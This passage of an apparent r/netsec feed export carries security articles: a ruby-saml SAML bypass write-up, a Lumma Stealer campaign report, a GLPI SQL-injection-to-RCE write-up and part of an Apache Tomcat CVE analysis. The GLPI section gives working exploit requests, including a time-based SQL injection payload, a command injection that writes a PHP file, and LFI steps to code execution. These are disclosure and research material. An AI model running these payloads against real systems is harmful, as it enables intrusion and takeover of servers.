@working_copy,\n  \"//ds:Signature\",\n  {\"ds\"=&gt;DSIG}\n)\n</code></pre><p><em>Hint: When reading the code snippets, you can tell the difference between queries for REXML and Nokogiri by looking at how they are called. REXML methods are prefixed with , whereas Nokogiri methods are called on .</em></p><p>Later, the actual  is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L293C1-L298C92\">read</a> from this element:</p><pre><code>base64_signature = REXML::XPath.first(\n  sig_element,\n  \"./ds:SignatureValue\",\n  {\"ds\" =&gt; DSIG}\n)\nsignature = Base64.decode64(OneLogin::RubySaml::Utils.element_text(base64_signature))\n</code></pre><p>Note: the name of the  element might be a bit confusing. While it contains the actual signature in the  node it also contains the part that is actually signed in the  node. Most importantly the  element contains the digest (hash) of the assertion and information about the used key.</p><p>So, an actual  element could look like this (removed namespace information for better readability):</p><pre><code>&lt;Signature&gt;\n    &lt;SignedInfo&gt;\n        &lt;CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /&gt;\n        &lt;SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /&gt;\n        &lt;Reference URI=\"#_SAMEID\"&gt;\n            &lt;Transforms&gt;&lt;Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /&gt;&lt;/Transforms&gt;\n            &lt;DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /&gt;\n            &lt;DigestValue&gt;Su4v[..]&lt;/DigestValue&gt;\n        &lt;/Reference&gt;\n    &lt;/SignedInfo&gt;\n    &lt;SignatureValue&gt;L8/i[..]&lt;/SignatureValue&gt;\n    &lt;KeyInfo&gt;\n        &lt;X509Data&gt;\n            &lt;X509Certificate&gt;MIID[..]&lt;/X509Certificate&gt;\n        &lt;/X509Data&gt;\n    &lt;/KeyInfo&gt;\n&lt;/Signature&gt;\n</code></pre><p>Later in the same method () there’s again a <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L307\">query for the Signature</a>(s)—but this time with Nokogiri.</p><pre><code>noko_sig_element = document.at_xpath('//ds:Signature', 'ds' =&gt; DSIG)\n</code></pre><p>Then the  element is taken from that signature and <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalized</a>:</p><pre><code>noko_signed_info_element = noko_sig_element.at_xpath('./ds:SignedInfo', 'ds' =&gt; DSIG)\n\ncanon_string = noko_signed_info_element.canonicalize(canon_algorithm)\n</code></pre><p>Let’s remember this  contains the canonicalized  element.</p><p>The  element is then also <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L314C6-L318C8\">extracted</a> with REXML:</p><pre><code> signed_info_element = REXML::XPath.first(\n        sig_element,\n        \"./ds:SignedInfo\",\n        { \"ds\" =&gt; DSIG }\n )\n</code></pre><p>From this  element the  node is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L324\">read</a>:</p><pre><code>ref = REXML::XPath.first(signed_info_element, \"./ds:Reference\", {\"ds\"=&gt;DSIG})\n</code></pre><pre><code>reference_nodes = document.xpath(\"//*[@ID=$id]\", nil, { 'id' =&gt; extract_signed_element_id })\n</code></pre><p>The method <code>extract_signed_element_id</code><a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L406C9-L406C34\">extracts</a> the signed element id with help of REXML. From the previous authentication bypass (CVE-2024-45409), there’s now a <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L328\">check</a> that only one element with the same ID can exist.</p><p>The first of the  is taken and canonicalized:</p><pre><code>hashed_element = reference_nodes[0][..]canon_hashed_element = hashed_element.canonicalize(canon_algorithm, inclusive_namespaces)\n</code></pre><p>The  is then <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L349C7-L349C59\">hashed</a>:</p><pre><code>hash = digest_algorithm.digest(canon_hashed_element)\n</code></pre><p>The  to compare it against is then <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L350C7-L355C99\">extracted</a> with REXML:</p><pre><code>encoded_digest_value = REXML::XPath.first(\n        ref,\n        \"./ds:DigestValue\",\n        { \"ds\" =&gt; DSIG }\n      )\ndigest_value = Base64.decode64(OneLogin::RubySaml::Utils.element_text(encoded_digest_value))\n</code></pre><p>Finally, the  (built from the element extracted by Nokogiri) is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L357\">compared</a> against the  (extracted with REXML):</p><pre><code>unless digests_match?(hash, digest_value)\n</code></pre><p>The  extracted some lines ago (a result of an extraction with Nokogiri) is later <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L366C7-L366C86\">verified against</a> (extracted with REXML).</p><pre><code>unless cert.public_key.verify(signature_algorithm.new, signature, canon_string)\n</code></pre><p>In the end, we have the following constellation:</p><ol><li>The assertion is extracted and canonicalized with Nokogiri, and then hashed. In contrast, the hash against which it will be compared is extracted with REXML.  </li><li>The SignedInfo element is extracted and canonicalized with Nokogiri - it is then verified against the SignatureValue, which was extracted with REXML.</li></ol><h2>Exploiting the parser differential<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#exploiting-the-parser-differential\" aria-label=\"Exploiting the parser differential\"></a></h2><p>The question is: is it possible to create an XML document where REXML sees one signature and Nokogiri sees another?</p><p>Ahacker1, participating in the bug bounty, was faster to produce a working exploit using a parser differential. Among other things, ahacker1 was inspired by the <a href=\"https://mattermost.com/blog/securing-xml-implementations-across-the-web/\">XML roundtrips vulnerabilities</a> published by Mattermost’s Juho Forsén in 2021.</p><p>Not much later, I produced an exploit using a different parser differential with the help of <a href=\"https://blog.trailofbits.com/2024/03/29/introducing-ruzzy-a-coverage-guided-ruby-fuzzer/\">Trail of Bits’ Ruby fuzzer</a> called ruzzy.</p><p>Both exploits result in an authentication bypass. Meaning that an attacker, who is in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization, can use it to construct assertions for any users which will be accepted by ruby-saml. Such a signature can either come from a signed assertion or response from another (unprivileged) user or in certain cases, it can even come from signed metadata of a SAML identity provider (which can be publicly accessible).</p><p>An exploit could look like this. Here, an additional Signature was added as part of the  element that is only visible to Nokogiri:</p><p>The  element (A) from the signature that is visible to Nokogiri is canonicalized and verified against the  (B) that was extracted from the signature seen by REXML.</p><p>The assertion is retrieved via Nokogiri by looking for its ID. This assertion is then canonicalized and hashed (C). The hash is then compared to the hash contained in the  (D). This DigestValue was retrieved via REXML. This DigestValue has no corresponding signature.</p><p>So, two things take place:</p><ul><li>A valid SignedInfo with DigestValue is verified against a valid signature. (which checks out)  </li><li>A fabricated canonicalized assertion is compared against its calculated digest. (which checks out as well)</li></ul><p>This allows an attacker, who is in possession of a valid signed assertion for any (unprivileged) user, to fabricate assertions and as such impersonate any other user.</p><h3>Check for errors when using Nokogiri<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#check-for-errors-when-using-nokogiri\" aria-label=\"Check for errors when using Nokogiri\"></a></h3><p>Parts of the currently known, undisclosed exploits can be stopped by checking for Nokogiri parsing errors on SAML responses. Sadly, those errors do not result in exceptions, but need to be checked on the <a href=\"https://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri%2FXML%2FDocument:errors\"></a> member of the parsed document:</p><pre><code>doc = Nokogiri::XML(xml) do |config|\n  config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET\nend\n\nraise \"XML errors when parsing: \" + doc.errors.to_s if doc.errors.any?\n</code></pre><p>While this is far from a perfect fix for the issues at hand, it renders at least one exploit infeasible.</p><p>We are not aware of any reliable indicators of compromise. While we’ve found a potential indicator of compromise, it only works in debug-like environments and to publish it, we would have to reveal too many details about how to implement a working exploit so we’ve decided that it’s better not to publish it. Instead, our best recommendation is to look for suspicious logins via SAML on the service provider side from IP addresses that do not align with the user’s expected location.</p><h2>SAML and XML signatures:as confusing as it gets<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#saml-and-xml-signaturesas-confusing-as-it-gets\" aria-label=\"SAML and XML signatures:as confusing as it gets\"></a></h2><p>Some might say it’s hard to integrate systems with SAML. That might be true. However, it’s even harder to write implementations of SAML using XML signatures in a secure way. As others have stated before: it’s probably best to <a href=\"https://ssoready.com/blog/engineering/ruby-saml-pwned-by-xml-signature-wrapping-attacks/#how-to-fix-this-disregard-the-spec\">disregard the specifications</a>, as following them doesn’t help build secure implementations.\nTo rehash how the validation works if the SAML assertion is signed, let’s have a look at the graphic below,  depicting a simplified SAML response. The assertion, which transports the protected information, contains a signature. Confusing, right?</p><p>To complicate it even more: What is even signed here? The whole assertion? No!</p><p>What’s signed is the  element and the  element contains a . This  is the hash of the canonicalized assertion with the signature element removed before the canonicalization. This two-stage verification process can lead to implementations that have a disconnect between the verification of the hash and the verification of the signature. This is the case for these Ruby-SAML parser differentials: while the hash and the signature check out on their own, they have no connection. The hash is actually a hash of the assertion, but the signature is a signature of a different  element containing another hash. What you actually want is a direct connection between the hashed content, the hash, and the signature. (And once the verification is done you only want to retrieve information from the exact part that was actually verified.) Or, alternatively, use a less complicated standard to transport a cryptographically signed username between two systems - but here we are.</p><p>In this case, the library already extracted the  and used it to verify the signature of its canonicalized string,. However, it did not use it to obtain the digest value. If the library had used the content of the already extracted  to obtain the digest value, it would have been secure in this case even with two XML parsers in use.</p><p>As shown once again: relying on two different parsers in a security context can be tricky and error-prone. That being said: exploitability is not automatically guaranteed in such cases. As we have seen in this case, checking for Nokogiri errors could not have prevented the parser differential, but could have stopped at least one practical exploitation of it.</p><p>The initial fix for the authentication bypasses does not remove one of the XML parsers to prevent API compatibility problems. As noted, the more fundamental issue was the disconnect between verification of the hash and verification of the signature, which was exploitable via parser differentials. The <a href=\"https://github.com/SAML-Toolkits/ruby-saml/pull/736\">removal of one of the XML</a> parsers was already planned for other reasons, and will likely come as part of a major release in combination with additional improvements to strengthen the library. If your company relies on open source software for business-critical functionality, consider <a href=\"https://github.com/sponsors\">sponsoring</a> them to help fund their future development and bug fix releases.</p><p>If you’re a user of ruby-saml library, make sure to update to the latest version, 1.18.0, containing fixes for <a href=\"https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-4vc4-m8qh-g8jm\">CVE-2025-25291</a> and <a href=\"https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-754f-8gm6-c4r2\">CVE-2025-25292</a>. References to libraries making use of ruby-saml (such as <a href=\"https://github.com/omniauth/omniauth-saml\">omniauth-saml</a>) need also be updated to a version that reference a fixed version of ruby-saml. We will publish a proof of concept exploit at a later date in the <a href=\"https://github.com/github/securitylab\">GitHub Security Lab repository</a>.</p><p>Special thanks to Sixto Martín, maintainer of ruby-saml, and Jeff Guerra from the GitHub Bug Bounty program.\nSpecial thanks also to ahacker1 for giving inputs to this blog post.</p><ul><li>2024-11-04: Bug bounty report demonstrating an authentication bypass was reported against a GitHub test environment evaluating ruby-saml for SAML authentication.  </li><li>2024-11-04: Work started to identify and test potential mitigations.  </li><li>2024-11-12: A second authentication bypass was found by Peter that renders the planned mitigations for the first useless.  </li><li>2024-11-13: Initial contact with Sixto Martín, maintainer of ruby-saml.  </li><li>2024-11-14: Both parser differentials are reported to ruby-saml, the maintainer responds immediately.  </li><li>2024-11-14: The work on potential patches by the maintainer and ahacker1 begins. (One of the initial ideas was to remove one of the XML parsers, but this was not feasible without breaking backwards compatibility).  </li><li>2025-02-04: ahacker1 proposes a non-backwards compatible fix.  </li><li>2025-02-06: ahacker1 also proposes a backwards compatible fix.  </li><li>2025-02-12: The 90 days deadline of GitHub Security Lab advisories ends.  </li><li>2025-02-16: The maintainer starts working on a fix with the idea to be backwards-compatible and easier to understand.  </li><li>2025-02-17: Initial contact with GitLab to coordinate a release of their on-prem product with the release of the ruby-saml library.  </li><li>2025-03-12: A fixed version of ruby-saml was released.</li></ul><div><article><div><div><p>Security Researcher at GitHub Security Lab</p></div></div></article></div>","contentLength":17509,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1ja6lxm/sign_in_as_anyone_bypassing_saml_sso/"},{"title":"New all-in-one monitoring project with leaks, cve db, ransomware info, ddos target, and news","url":"https://cybermonit.com/leaks","date":1741850577,"author":"/u/Electrical-Wish-4221","guid":798,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1ja6gyj/new_allinone_monitoring_project_with_leaks_cve_db/"},{"title":"New Lumma Stealer campaign abuses Reddit threads to drop malware via fake WeTransfer links","url":"https://moonlock.com/fake-reddit-wetransfer-lumma-stealer","date":1741821147,"author":"/u/Individual-Gas5276","guid":810,"unread":true,"content":"<p>A new large-scale cybercriminal operation has been identified operating in the wild.&nbsp;</p><p>This new threat campaign ran over 1,000 fake sites, impersonating WeTransfer and Reddit. The goal of the campaign is to trick users into downloading the Lumma stealer. But it is also part of a growing trend that is becoming the norm. Let’s dive into it.&nbsp;</p><h2>1,000 fake Reddit and WeTransfer sites coded to load Lumma&nbsp;</h2><p>Recently, the X (formerly Twitter) user @crep1x, a Cybercrime Analyst from <a href=\"https://www.sekoia.io/en/homepage/\" target=\"_blank\" rel=\"noreferrer noopener\">Sequoia</a> tracking adversaries’ activities and infrastructure, pulled back the curtain on a massive new cybercriminal operation.&nbsp;&nbsp;&nbsp;</p><p>@crep1x shared a list of Indicators of Compromise (IoC) with about <a href=\"https://gist.githubusercontent.com/qbourgue/071c333ff5182f031da3ba55cc7da1ec/raw/ec4ba396c0d1052cc8b0a69c1bad1e0e5aef2ab6/malicious_domains_impersonating_reddit_wetransfer_selfau3_dropper_lumma_stealer_20012025.txt\">1,000 malicious domains hosting webpages</a>, a shocking amount of domains. Threat actors used these pages to trick users into downloading password-protected files that concealed malware, specifically <a href=\"https://moonlock.com/lumma-stealer\">Lumma Stealer</a>. &nbsp;</p><p>“These archives contain an AutoIT dropper, we internally named #SelfAU3 Dropper at&nbsp;@sekoia_io,” @crep1x said.&nbsp;</p><p>Lumma Stealer is offered on the dark web under the malware-as-a-service (MaaS) business model. This means that those developing the stealer are continually enhancing the malware with updates and new features while making it available to any operator (criminals or black hatters who rent out or buy the source code of the malware).&nbsp;</p><p>Since August 2022, when it was first spotted, Lumma has been linked to Russian-speaking hacker forums. Although Lumma can extract sensitive data from web browsers and files, it is not heavily used as nation-state spyware.&nbsp;The malware is designed for criminals seeking to earn illegal financial gains.</p><p>Lumma goes after web browser data. It targets cryptocurrency wallets and two-factor authentication (2FA) browser extensions.</p><p>The stealer is promoted on Telegram, with several Telegram bots selling their services, reporting bugs, or offering support and other resources.&nbsp;</p><p>Additionally, threat actors are often combining Lumma Stealer campaigns with the <a href=\"https://moonlock.com/atomic-macos-stealer\">AMOS stealer</a>. This double stealer approach can breach victims’ machines no matter what operating system they are running, Windows or Mac.&nbsp;&nbsp;</p><p>Efstratios Lontzetidis, a Cyber Threat Intelligence Researcher based in Athens, Greece, explained that the <a href=\"https://medium.com/@s.lontzetidis/lumma-2024-dominating-the-info-stealer-market-070e7d8fa3d6\">Lumma malware is offered under three plans</a>: Experienced ($250/month), Professional ($500/month), and Corporate ($1,000/month).</p><p>The particular threat campaign that impersonates WeTransfer and Reddit seems to have been done under a Corporate Lumma plan. This can be inferred due to the vast infrastructure discovered — 1,000 websites.&nbsp;</p><p>While Lumma’s development and distribution are linked to Russian black hatters, operators can be based anywhere in the world. So, the presence of Lumma does not imply attribution. </p><p>It is worth noting that Lumma developers ban operators from targeting Russian-speaking organizations and companies.&nbsp;</p><h3>Can Lumma breach macOS or Safari?</h3><p>At the present time, Lumma Stealer malware primarily targets Windows systems through deceptive tactics.&nbsp;The stealer leverages commands that often involve the Windows Run dialog and PowerShell scripts. These are specific to the Windows operating system.&nbsp;</p><p>Lumma can also breach browsers like Chrome, Firefox, and others. However, given that Safari is predominantly used on macOS and iOS platforms, which do not support these Windows-specific features, it is unlikely that Lumma can compromise the Safari web browser. At least, that’s the case for now. This can change very rapidly. &nbsp;&nbsp;</p><p>As mentioned, large-scale financially driven phishing criminal operations like these have begun to distribute Windows stealers and macOS stealers alike. Their fake webpages can gather operating system information and redirect users to the malware that fits their OS.</p><p>More importantly, malware developers are also constantly improving their malware, and stealers that can breach Windows and Macs are the holy grail.</p><h3>Future outlook for large-scale cybercriminal campaigns</h3><p>Based on our observations and investigations from last year and this year, we expect more large-scale cyber criminal operations like these to emerge. Malware automation, MaaS services offered on the dark web, GenAI, ready-to-use phishing kits, and fake webpage generators are widely available for anyone online.&nbsp;</p><p>We have reported on threat campaigns in which cybercriminals continually increase their digital attack surface to cast a wider net. This often means generating a significant number of domains for each campaign and taking to different media for automated distribution and promotion. From Google Ads abuse to social media and platforms like Reddit, GitHub, and others, everything follows this trend.</p><p>This cyberattack is by no means unique but part of a wider trend where vast, malicious infrastructures and C2 servers are rapidly set up.</p><p>Cybercriminals running these campaigns have also become very good at hiding their tracks. Once a report exposes their scams and illegal operations, the entire infrastructure disappears, often leaving cybersecurity researchers empty-handed, with little information about the operation and even less information for attribution.</p><p>Creating vast infrastructures also makes the work of security researchers very hard. Tracking and tracing a couple of domains can be done, but analyzing 1,000 is a nightmare.</p><p>To stay safe from these threats, use strong passwords, enable MFA, and only engage with websites that are verified and official. Never download files, and understand that more threat campaigns like these, and maybe even bigger ones, are expected.&nbsp;</p><p>The reason why these large-scale phishing campaigns prevail is simple. For criminals, it is a low-risk, high-reward opportunity. All they have to do is lease out a stealer and hire the services that come with it. Until this business model is disrupted, it will only continue to grow.</p>","contentLength":5842,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9xq07/new_lumma_stealer_campaign_abuses_reddit_threads/"},{"title":"Ruthless Mantis - Modus Operandi","url":"https://catalyst.prodaft.com/public/report/modus-operandi-of-ruthless-mantis/overview","date":1741814119,"author":"/u/small_talk101","guid":803,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9v0dh/ruthless_mantis_modus_operandi/"},{"title":"Pre-authentication SQL injection to RCE in GLPI (CVE-2025-24799/CVE-2025-24801)","url":"https://blog.lexfo.fr/glpi-sql-to-rce.html","date":1741776837,"author":"/u/uBaze","guid":806,"unread":true,"content":"<p>Several  instances have been identified during Red Team engagements. The software is popular with French-speaking companies, some of those even expose their instances directly on the Internet. GLPI has been historically known to harbor multiple easy-to-find vulnerabilities, and because it is often connected to an Active Directory, finding a vulnerability on this application for Red Team engagements or internal infrastructure audits could lead to initial access to the internal network and the recovery of an active directory account.</p><p>Multiple SQL injections on GLPI have been reported in the past. Most of them are considered to be post-authenticated and require an account to trigger the vulnerability (1) (3) (4). The ones accessible pre-authentication are quite rare (2) (5) and have been patched on the instances found during our external reconnaissance phase.</p><p>A new SQL injection has been found on the Inventory native feature of GLPI (which is commonly enabled). This feature is accessible without any required authentication mechanism.</p><p>At the time of this article's writing,  was the latest stable version, and it will be used as an example, but the vulnerability may affect previous versions.</p><p>The  function found in  is an accessible pre-authentication function used by the GLPI agent for inventory purposes.</p><div><pre><code></code></pre></div><p>This function takes user inputs and stores them into variables such as , then passed to the  function after going through a sanitizing function  since <a href=\"https://github.com/glpi-project/glpi/commit/5b03740aaf57974207e2555ff710add35d7a82e9\">10.0.7</a>.</p><h2>dbEscapeRecursive() - 10.0.17</h2><div><pre><code></code></pre></div><p>This function takes an array as input and recursively calls  to escape its input, the vulnerability is easily catchable here. What if we could send a value that is neither an  nor a ?</p><h2>handleRequest() - 10.0.17</h2><p>In the  function used to parse agent requests, it is possible to perform an agent request using two methods, XML and JSON.</p><div><pre><code></code></pre></div><p>While the  only performs a quick , it can only create , , , and  objects (which does not properly have a  function). The  however creates a  object from the user input.</p><div><pre><code></code></pre></div><p>This is the perfect candidate to bypass the  function, as it is an object that can be converted to a string easily.</p><div><pre><code>php &gt; $xml = simplexml_load_string('&lt;test&gt;a&lt;/test&gt;');\nphp &gt; var_dump($xml);\nobject(SimpleXMLElement)#2 (1) {\n  [0]=&gt;\n  string(1) \"a\"\n}\nphp &gt; var_dump($xml.\"toString\");\nstring(9) \"atoString\"\n</code></pre></div><p>To exploit this vulnerability, an XML request to the agent request endpoint is crafted and leads to an SQL injection exploitable using a simple time-based attack.</p><div><pre><code>POST /index.php/ajax/ HTTP/1.1\nHost: glpi\nUser-Agent: python-requests/2.32.3\nContent-Type: application/xml\nContent-Length: 232\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;xml&gt;\n    &lt;QUERY&gt;get_params&lt;/QUERY&gt;\n    &lt;deviceid&gt;', IF((1=1),(select sleep(5)),1), 0, 0, 0, 0, 0, 0);#&lt;/deviceid&gt;\n    &lt;content&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/content&gt;\n&lt;/xml&gt;\n</code></pre></div><p>Using this simple request, the server sleeps for 5 seconds due to the  condition being true. It is now possible to extract any data from the database using the privileges of the current GLPI database user.</p><p>It is important to note that the structure of the database changes from one version to another. The number of columns in the query above may therefore be different.</p><p>Now that  privileges to the database have been acquired, multiple ways exist to gain a valid session. The obvious one is recovering accounts from the database and attempting a password crack. However, with the passwords being stored using , it could be a challenge to recover the clear text of a technician or super-administrator account.</p><p>If the  of an account is set in the database, this can be used to easily obtain a valid session and gain access to the GUI of GLPI through the API authentication method.</p><div><pre><code>&lt;?php\nPOST /glpi/front/login.php HTTP/1.1\nHost: &lt;redacted&gt;\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 212\nOrigin: http://&lt;redacted&gt;\nConnection: keep-alive\nReferer: http://&lt;redacted&gt;/glpi/index.php\n\nredirect=&amp;_glpi_csrf_token=&lt;redacted&gt;&amp;field&lt;redacted&gt;=test&amp;field&lt;redacted&gt;=test&amp;auth=local&amp;submit=&amp;user_token=&lt;api_token&gt;\n</code></pre></div><p>The server then answers with a valid cookie that can be used to access the GUI.</p><div><pre><code>Set-Cookie: glpi_&lt;redacted&gt;=&lt;redacted&gt;; path=/\n</code></pre></div><p>This token is used in the calendar feature and allows you to share a personal calendar using a unique token. This token uses the  method to authenticate a session, then destroy the session after printing the user's calendar.</p><p>Previously, it was possible to recover the impersonated session using a  by forcing a fatal error before the script ends its execution. This has been mitigated since 10.0.9 by setting the option  to .</p><p>The easiest method to obtain remote code execution once an administrator account has been compromised is to go to the plugins Marketplace. It used to even host a \"Shell commands\" plugin that has since been disabled for remote installations, however, there are still plenty of vulnerable plugins.</p><p>Sometimes, the GLPI server does not have direct internet access, however, a proxy server can be configured from the administration interface, this can be leveraged by an attacker for example by setting up their own proxy server or by configuring the internal corporate proxy.</p><p>For example, the public plugin  is still vulnerable to a system command injection.</p><div><pre><code>POST /glpi/marketplace/printercounters/ajax/process.php HTTP/1.1\nHost: &lt;redacted&gt;\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Glpi-Csrf-Token: &lt;redacted&gt;\nX-Requested-With: XMLHttpRequest\nContent-Length: 266\nConnection: keep-alive\nReferer: http://&lt;redacted&gt;/glpi/marketplace/printercounters/front/config.form.php\nCookie: glpi_&lt;redacted&gt;=&lt;redacted&gt;; stay_login=0\n\naction=killProcess&amp;items_id=1231231';echo `{echo,PD9waHAgcGhwaW5mbygpOyA/Pg%3d%3d}|{base64,-d}|{tee,rz.php}`;%23\n</code></pre></div><h2>Method 2: Local File Inclusion - 10.0.17</h2><p>A local file inclusion has also been identified in the PDF export functionality. This functionality allows an administrator to export various tables to PDF format using the library . It is possible to set up a custom PDF font in the configuration entry  (changed globally through a super-admin account, or by any account through their personnalization options inside their user profile), which is not properly checked for directory traversal, either from the  or  side.</p><p>PDF fonts are simply php files stored inside the TCPDF  folder, due to this issue it is possible to include any PHP files from the system if the font name is controlled.</p><div><pre><code></code></pre></div><p>To exploit this vulnerability, a few preliminary steps are necessary. By default, php files are not allowed to be uploaded in GLPI, but this list can be altered by going to the Dropdown option \"Document types\" accessible at . Then, the path to the  folder needs to be obtained, this information is available in , once it has been obtained, a simple file upload can be performed through  (available on most forms of GLPI).</p><ul><li>Update the Document Type dropdown list to allow  extensions</li><li>Recover the  location from </li><li>Upload a PHP file using </li><li>Set the  configuration to <code>../../../../../../../../{GLPI_TMP_DIR}/uploadedfile</code></li><li>Trigger the local file inclusion by exporting a table to PDF, for example <code>/front/report.dynamic.php?item_type=Computer&amp;sort%5B0%5D=1&amp;order%5B0%5D=ASC&amp;start=0&amp;criteria%5B0%5D%5Bfield%5D=view&amp;criteria%5B0%5D%5Blink%5D=contains&amp;criteria%5B0%5D%5Bvalue%5D=&amp;display_type=2</code></li></ul><p>The inventory feature in  is vulnerable to an unauthenticated SQL injection. While this feature is not enabled by default, it was enabled in most, if not all, installations we encountered during our Red Team assessments.</p><p>By exploiting this vulnerability, it is possible to obtain a valid GUI session through the  or  columns in database which are stored in clear text if these have been previously set up.</p><p>Once authenticated, it is possible to exploit a local file inclusion vulnerability using the PDF export feature and achieve remote code execution on vulnerable instances.</p><ul><li>2024-12-25 - Discovery of the vulnerability</li><li>2025-01-28 - Report of the vulnerability through </li><li>2025-01-28 -  validates the report and assigns  (exécution de code à distance)</li><li>2025-01-28 -  validates the report and assigns  (injection SQL)</li><li>2025-02-12 - Release patched version </li><li>2025-03-12 - Article released</li></ul>","contentLength":8362,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9hcdw/preauthentication_sql_injection_to_rce_in_glpi/"},{"title":"Analysis of CVE-2025-24813 Apache Tomcat Path Equivalence RCE","url":"https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html","date":1741766426,"author":"/u/buherator","guid":802,"unread":true,"content":"<p>On 10. March 2025. ASF <a href=\"https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq\">announced</a> CVE-2025-24813, an Apache Tomcat vulnerability that may result in information disclosure or corruption, and even remote code execution. This is a quick and dirty analysis explaining the parts of the picture that are not in the advisory or can't be deduced trivially from the source code. Please read the linked materials and use your favorite search engine on the side! </p><h2>Configuration Requirements</h2><p>I tested the vulnerability on Debian 12. At the time of writing the latest package version for Tomcat 10 is , where the discussed vulnerability is still unfixed.</p><p>The advisory states the following requirements for all exploitation vectors:</p><ul><li><em>\"writes enabled for the default servlet (disabled by default)\"</em></li><li><em>\"support for partial PUT (enabled by default)\"</em></li></ul><p>The first requirement is related to the  property of the <a href=\"https://tomcat.apache.org/tomcat-10.0-doc/default-servlet.html\">Default Servlet</a>. We have to set this property to false in the  configuration of the server:</p><div><pre><code>defaultorg.apache.catalina.servlets.DefaultServletreadonlyfalse</code></pre></div><p>For the RCE the following additional configuration is required:</p><ul><li><em>\"application was using Tomcat's file based session persistence with the default storage location\"</em></li></ul><p>This can be satisfied by adding the following directives to  (I used the global <code>/etc/tomcat10/context.xml</code> file):</p><div><pre><code></code></pre></div><p>The  class in the  tag instructs Tomcat to store sessions in individual files - this is a different solution than the sample configuration provided in  that stores all session data in a single file with a well-defined filename.</p><p>The relevant part of the vulnerable code is this part of the  method:</p><div><pre><code></code></pre></div><p>We can trigger this code path with a request like this:</p><div><pre><code>\n\nx\n</code></pre></div><p>The  header indicates a  PUT, triggering the code path. The temporary file creation logic listed above creates a new file under the \"work\" directory of Tomcat (<code>/var/lib/tomcat10/work/Catalina/&lt;hostname&gt;/&lt;app&gt;/</code> on Debian, I could never wrap my head around Tomcats terminology with CATALINA_BASE&amp;co...). Coincidentally, this same directory is used by  to save sessions, which are serialized Java objects.</p><p>Unfortunately we can't overwrite these files directly, because the  passed to  always starts with a , so our temporary filename will always start with a . </p><p>I tried to circumvent the problem of the dot (slash) prefix without success:</p><ul><li>Requests to absolute paths not beginning with  are rejected</li><li>Full URL's in the first request line are normalized to absolute paths (that start with a )</li><li>Unencoded forward slashes are normalized, requests with backslashes are denied</li><li>Tomcat handles  specially, but I could only use this to make the server ignore parts of the path (but not the first slash) </li><li>Tomcat denies requests containing URL-encoded forward or backward slashes. There is a setting to disable this behavior, but in that case the paths will just contain percent-encoded values</li><li>My UTF-8/Unicode fu wasn't enough either</li></ul><p>The good news is that if we place a file with a  extension in the work directory, it gets periodically parsed by Tomcat... This behavior of file based persistence is a really nice primitive! </p><p>Note that this exploitation path doesn't rely on <a href=\"https://www.openwall.com/lists/oss-security/2025/03/10/5\">\"Path Equivalence\"</a>: the filename is basically directly controlled, and the imposed restrictions (no slashes) let filenames relevant to  slip right through. Path equivalence seems more relevant in the information disclosure/corruption scenario.</p><p>The following are the stated prerequisites for this part:</p><ol><li>writes enabled for the default servlet 